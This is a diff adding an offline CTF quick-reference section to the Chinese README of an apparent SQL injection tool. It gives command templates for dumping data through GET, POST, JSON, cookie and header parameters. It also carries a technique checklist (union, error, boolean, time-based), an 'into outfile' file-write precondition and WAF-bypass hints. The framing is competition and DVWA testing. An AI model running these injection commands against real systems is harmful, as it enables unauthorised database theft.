@@ -412,6 +412,34 @@ WAF 还会**按参数分别扫描**：登录框常只过滤用户名不过滤密
 不存在 → SQL 报错（吞错页），据此逐词试探内置常用表名/列名字典
 （`dictionaries/bruteforce.yaml`，可自行扩充）。
 
+## 线下赛速查手册（无网络环境）
+
+### 场景 → 命令模板
+
+| 场景 | 命令要点 |
+| --- | --- |
+| GET 参数回显页（新闻/详情页） | `cli -u "http://IP/path/news.php?id=1" -p id --dump` |
+| 登录框（POST 双字段） | `cli -u "http://IP/login.php" -p password --method POST --data username=admin password=1 --dump` |
+| JSON/原样 body 的 api | `cli -u "http://IP/api/index.php" -p ip --method PUT --data ip=1 --raw-body --dump` |
+| 搜索页（布尔盲注） | 同上，回显有差异即可；无差异加 `--time-sec 1` 让时间通道兜底 |
+| 比赛自造 flag 格式 | 加 `--flag-re "XXCTF\\{[^}]+\\}"`（未命中正确格式时 first-flag 短路会失效） |
+| 有请求限速/封 IP 的平台 | 加 `--max-requests 800 --delay 0.2`；连续空响应≥12 自动硬停保护 |
+| 参数在 Cookie/Header 位 | `--cookie "user=1"` + `-p user`；`--header "X-Forwarded-For=1" + -p` 同理 |
+| 已知表/列想直取 | 加 `--table-hint 表名`（盲注族跳过全库枚举） |
+
+### 离线作战清单（开赛前一晚）
+
+1. 双 exe（GUI/CLI）从 Release 下载，或带 `.venv` 的整个目录（`pip install -r requirements.txt` 需提前做好）
+2. 本 README + 题解 markdown（Notion 线下打不开）
+3. `tests/regression.py` 跑一遍 5/5（改过配置/环境后必做）
+4. flag 正则确认：先看一题的 flag 样例 → 对应 `--flag-re`；FLAG_PATTERN 已内置 flag/ctfshow/DASCTF/SYC/NSS/BUU/hgame/moectf 等常见前缀
+5. 数据流自查口诀：能回显 → union；有报错 → error；真假两态 → bool；全无 → time（`--time-sec 1` 提速）；`into outfile` 前自查 `secure_file_priv` 为空 + DB 与 Web 同容器
+
+### 行为约定
+
+- flag 只打印不提交；`--max-requests` 用尽或连续异常会硬停保护 IP
+- 检测顺序：数字型 → 闭合 → union-first → 时间兜底，全灭时 WAF 清单会给出每个 token 的可用/被拦证据与绕过建议
+
 ## 测试环境
 
 - 本地 DVWA：`http://localhost`（admin / password，安全等级 Low→Impossible 全覆盖）
